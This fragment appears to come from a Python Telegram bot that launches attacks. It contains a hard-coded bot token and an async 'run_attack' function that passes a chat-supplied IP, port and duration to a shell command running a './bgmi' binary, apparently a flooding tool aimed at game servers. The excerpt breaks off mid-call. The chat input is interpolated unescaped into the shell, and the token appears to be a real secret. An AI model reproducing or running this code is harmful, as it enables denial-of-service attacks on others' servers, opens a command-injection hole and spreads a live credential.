...
TELEGRAM_BOT_TOKEN = '7420677434:AAE-n0u9rdYKO6gFPYl5ZPnIYxF73zvjBGI'
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 13 1000",
